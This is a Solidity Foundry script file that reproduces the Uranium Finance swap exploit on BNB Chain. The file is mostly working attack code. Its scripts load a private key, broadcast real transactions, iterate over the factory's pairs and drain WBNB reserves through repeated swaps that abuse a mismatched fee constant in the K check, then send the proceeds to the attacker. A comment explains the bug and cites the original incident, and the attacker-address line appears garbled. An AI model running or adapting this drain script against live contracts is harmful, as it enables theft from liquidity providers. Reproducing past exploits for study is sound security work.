// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {IERC20, IUniswapV2Factory, IUniswapV2Pair, IUniswapV2Router} from "script/interface.sol";

import "forge-std/Script.sol";

// @KeyInfo - Total Lost : $50 M
// Attacker : 0xd9936EA91a461aA4B727a7e0xc47bdd0a852a88a019385ea3ff57cf8de79f019d3661bcD6cD257481c
// AttackContract : 0x2b528a28451e9853f51616f3b0f6d82af8bea6ae
// Txhash : https://bscscan.com/tx/0x5a504fe72ef7fc76dfeb4d979e533af4e23fe37e90b5516186d5787893c37991

// REF: https://twitter.com/FrankResearcher/status/1387347025742557186
// Credit: https://medium.com/immunefi/building-a-poc-for-the-uranium-heist-ec83fbd83e9f

/*
Vuln code: 
   uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16));
   uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16));
   require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), ‘UraniumSwap: K’);

Critically, we see in Uranium’s implementation that the magic value for fee calculation is 10000 instead of the original 1000. 
The check does not apply the new magic value and instead uses the original 1000. 
This means that the K after a swap is guaranteed to be 100 times larger than the K before the swap when no token balance changes have occurred.*/
// CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
// address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant tether = address(0x55d398326f99059fF775485246999027B3197955);
address constant busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
address constant u92 = 0x670De9f45561a2D02f283248F65cbd26EAd861C8;

address constant uraniumFactory = 0xA943eA143cd7E79806d670f4a7cf08F8922a454F;
IUniswapV2Factory constant factory = IUniswapV2Factory(uraniumFactory);

interface IWrappedNative {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface ERC20 {
    function name() external view returns (string memory);
}

contract RW1 is Script {
    uint256 id = vm.envUint("RW1_ID");
    uint256 secret = vm.envUint("PRIVATE_KEY");
    address attacker = vm.rememberKey(secret);

    function run() public {
        vm.startBroadcast(secret);

        Exploit_RW1 _rw1 = new Exploit_RW1();
        if (IERC20(wbnb).balanceOf(address(_rw1)) == 0) {
            uint256 bal = 1e4;
            IWrappedNative(wbnb).deposit{value: bal}();
            IERC20(wbnb).transfer(address(_rw1), IERC20(wbnb).balanceOf(address(attacker)));
            console.log("WBNB start : ", IERC20(wbnb).balanceOf(address(_rw1)));
        }

        IUniswapV2Pair pair = IUniswapV2Pair(factory.allPairs(id));
        _rw1.testExploit(pair);

        IWrappedNative(wbnb).withdraw(IERC20(wbnb).balanceOf(attacker));

        console.log("BUSD REMAIN : ", IERC20(busd).balanceOf(attacker));
        console.log("WBNB REMAIN : ", IERC20(wbnb).balanceOf(attacker));
        console.log("U92 REMAIN : ", IERC20(u92).balanceOf(attacker));

        console.log((attacker.balance) / 1e18); // 10 ether
        console.log((attacker.balance) % 1e18); // 10 ether

        vm.stopBroadcast();
    }
}

contract Exam1 is Script {
    uint256 secret = vm.envUint("PRIVATE_KEY");
    address attacker = vm.rememberKey(secret);

    function setUp() public {
        vm.label(wbnb, "wbnb");
        vm.label(busd, "busd");
        vm.label(tether, "tether");
        vm.label(uraniumFactory, "uraniumFactory");
        vm.label(attacker, "attacker");
    }

    /// @dev
    /// forge script -f exam1 Exam1
    function run() public {
        vm.startBroadcast(secret);

        if (IERC20(wbnb).balanceOf(attacker) == 0) {
            uint256 bal = attacker.balance - 1 ether;
            IWrappedNative(wbnb).deposit{value: bal}();
            console.log("WBNB start : ", IERC20(wbnb).balanceOf(attacker));
        }

        testExploit();

        console.log("BUSD : ", IERC20(busd).balanceOf(attacker) / 1e18, IERC20(busd).balanceOf(attacker) % 1e18);
        console.log("TETHER : ", IERC20(tether).balanceOf(attacker) / 1e18, IERC20(tether).balanceOf(attacker) % 1e18);
        console.log("U92 : ", IERC20(u92).balanceOf(attacker) / 1e18, IERC20(u92).balanceOf(attacker) % 1e18);
        console.log("WBNB : ", IERC20(wbnb).balanceOf(attacker) / 1e18, IERC20(wbnb).balanceOf(attacker) % 1e18);

        // for (uint256 i = 0; i < factory.allPairsLength(); i++) {
        //     IUniswapV2Pair pair = IUniswapV2Pair(factory.allPairs(i));
        //     console.log("----- %x -----", address(pair));
        //     console.log(ERC20(pair.token0()).name(), pair.token0(), ERC20(pair.token1()).name(), pair.token1());
        //     (uint256 res0, uint256 res1,) = pair.getReserves();
        //     console.log("Reserves : ", res0 / 1e6, res1 / 1e6);
        //     console.log("-----------------");
        // }
        IWrappedNative(wbnb).withdraw(IERC20(wbnb).balanceOf(attacker));
        console.log("Balance : ", attacker.balance / 1e18, attacker.balance % 1e18);

        vm.stopBroadcast();
    }

    uint256[] indexes;

    function testExploit() public {
        for (uint256 i = 0; i < factory.allPairsLength(); i++) {
            IUniswapV2Pair pair = IUniswapV2Pair(factory.allPairs(i));
            address tokenA = pair.token0();
            address tokenB = pair.token1();

            if (tokenA != wbnb && tokenB != wbnb || tokenA == 0x1cb3B735c498eF33aD98C2D9c52666264c381399) {
                continue;
            }

            indexes.push(i);

            uint256 wbnb_bal = IERC20(wbnb).balanceOf(attacker);

            bool isTokenA_wbnb = tokenA == wbnb;

            uint256 reserve0;
            uint256 reserve1;
            uint256 wbnb_reserve;
            uint256 sub_reserve;
            {
                (reserve0, reserve1,) = pair.getReserves();
                wbnb_reserve = isTokenA_wbnb ? reserve0 : reserve1;
                sub_reserve = isTokenA_wbnb ? reserve1 : reserve0;
            }

            address sub_token = isTokenA_wbnb ? tokenB : tokenA;

            uint256 reserve_ratio = reserve0 > reserve1 ? reserve0 / reserve1 : reserve1 / reserve0;
            console.log("BALANCING");
            while (reserve_ratio > 10 && wbnb_reserve > 1e3) {
                takeFunds(wbnb, sub_token, IERC20(wbnb).balanceOf(attacker));
                takeFunds(sub_token, wbnb, IERC20(sub_token).balanceOf(attacker));
                {
                    (reserve0, reserve1,) = pair.getReserves();
                    reserve_ratio = reserve0 > reserve1 ? reserve0 / reserve1 : reserve1 / reserve0;
                }
            }

            uint256 bal_ = 100;
            console.log("EXPLOIT");
            while (wbnb_reserve > 1e3) {
                takeFunds(wbnb, sub_token, bal_);
                takeFunds(sub_token, wbnb, IERC20(sub_token).balanceOf(attacker));
                {
                    (reserve0, reserve1,) = pair.getReserves();
                    wbnb_reserve = isTokenA_wbnb ? reserve0 : reserve1;
                    sub_reserve = isTokenA_wbnb ? reserve1 : reserve0;
                }
                bal_ *= 2;
                bal_ = bal_ > 1000 ether ? 1000 ether : bal_;
                // bal_ = sub_reserve / 10000 < bal_ ? sub_reserve / 10000 : bal_;
            }

            // for (uint256 i = 0; i < 70; i++) {
            //     bal_ = IERC20(tokenA).balanceOf(attacker);
            //     if (bal_ > 0) {
            //         bal_ = bal_ > 100 ether ? 100 ether : bal_;
            //         if (i > 36) {
            //             bal_ /= 10 ** (i / 2 - 18);
            //         }
            //         takeFunds(tokenA, tokenB, bal_);
            //     }

            //     (reserve0, reserve1,) = pair.getReserves();
            //     if (reserve0 * 1e3 < reserve1) {
            //         continue;
            //     }
            //     bal_ = IERC20(tokenB).balanceOf(attacker);
            //     if (bal_ > 0) {
            //         bal_ = bal_ > 100 ether ? 100 ether : bal_;
            //         if (i > 36) {
            //             bal_ /= 10 ** (i / 2 - 18);
            //         }
            //         takeFunds(tokenB, tokenA, bal_);
            //     }
            // }

            if (IERC20(wbnb).balanceOf(attacker) < wbnb_bal) {
                console.log("WARNING : ", tokenA, tokenB);
                console.log(int256(IERC20(wbnb).balanceOf(attacker)) - int256(wbnb_bal));
            } else if (IERC20(wbnb).balanceOf(attacker) > wbnb_bal) {
                console.log("SUCCESS : ", tokenA, tokenB);
                console.log(IERC20(wbnb).balanceOf(attacker) / 1e18, IERC20(wbnb).balanceOf(attacker) % 1e18);
            }
            console.log("-----------------");
        }

        for (uint256 i = 0; i < indexes.length; i++) {
            console.log("Index : ", indexes[i]);
        }
    }

    function takeFunds(address in_token, address out_token, uint256 amount) public {
        if (amount == 0) {
            return;
        }

        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(out_token), address(in_token)));

        uint256 res0;
        uint256 res1;
        (res0, res1,) = pair.getReserves();
        uint256 comp = pair.token0() == address(out_token) ? res0 : res1;
        uint256 amountOut = amount * 99 > comp ? comp * 98 / 100 : amount * 98;
        if (amountOut < 100 || IERC20(in_token).balanceOf(attacker) < amountOut / 99) {
            return;
        }
        IERC20(in_token).transfer(address(pair), amountOut / 99);

        pair.swap(
            pair.token0() == address(out_token) ? amountOut : 0,
            pair.token0() == address(out_token) ? 0 : amountOut,
            attacker,
            new bytes(0)
        );

        (res0, res1,) = pair.getReserves();
        // console.log(res0, res1);
    }
}

contract Exploit_RW1 {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function testExploit(IUniswapV2Pair pair) public {
        address tokenA = pair.token0();
        address tokenB = pair.token1();

        if (tokenA != wbnb && tokenB != wbnb || tokenA == 0x1cb3B735c498eF33aD98C2D9c52666264c381399) {
            return;
        }

        bool isTokenA_wbnb = tokenA == wbnb;

        uint256 reserve0;
        uint256 reserve1;
        uint256 wbnb_reserve;
        uint256 sub_reserve;
        {
            (reserve0, reserve1,) = pair.getReserves();
            wbnb_reserve = isTokenA_wbnb ? reserve0 : reserve1;
            sub_reserve = isTokenA_wbnb ? reserve1 : reserve0;
        }

        address sub_token = isTokenA_wbnb ? tokenB : tokenA;
        uint256 reserve_ratio = reserve0 > reserve1 ? reserve0 / reserve1 : reserve1 / reserve0;

        while (reserve_ratio > 10 && wbnb_reserve > 1e3) {
            takeFunds(wbnb, sub_token, IERC20(wbnb).balanceOf(address(this)));
            takeFunds(sub_token, wbnb, IERC20(sub_token).balanceOf(address(this)));
            {
                (reserve0, reserve1,) = pair.getReserves();
                reserve_ratio = reserve0 > reserve1 ? reserve0 / reserve1 : reserve1 / reserve0;
            }
        }

        uint256 bal_ = 100;
        while (wbnb_reserve > 1e3) {
            takeFunds(wbnb, sub_token, bal_);
            takeFunds(sub_token, wbnb, IERC20(sub_token).balanceOf(address(this)));
            {
                (reserve0, reserve1,) = pair.getReserves();
                wbnb_reserve = isTokenA_wbnb ? reserve0 : reserve1;
                sub_reserve = isTokenA_wbnb ? reserve1 : reserve0;
            }
            bal_ *= 2;
            bal_ = bal_ > 1000 ether ? 1000 ether : bal_;
            // bal_ = sub_reserve / 10000 < bal_ ? sub_reserve / 10000 : bal_;
        }
        IERC20(wbnb).transfer(owner, IERC20(wbnb).balanceOf(address(this)));
    }

    function takeFunds(address in_token, address out_token, uint256 amount) public {
        if (amount == 0) {
            return;
        }

        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(out_token), address(in_token)));

        uint256 res0;
        uint256 res1;
        (res0, res1,) = pair.getReserves();
        uint256 comp = pair.token0() == address(out_token) ? res0 : res1;
        uint256 amountOut = amount * 99 > comp ? comp * 98 / 100 : amount * 98;
        if (amountOut < 100 || IERC20(in_token).balanceOf(address(this)) < amountOut / 99) {
            return;
        }
        IERC20(in_token).transfer(address(pair), amountOut / 99);

        pair.swap(
            pair.token0() == address(out_token) ? amountOut : 0,
            pair.token0() == address(out_token) ? 0 : amountOut,
            address(this),
            new bytes(0)
        );

        (res0, res1,) = pair.getReserves();
        // console.log(res0, res1);
    }
}
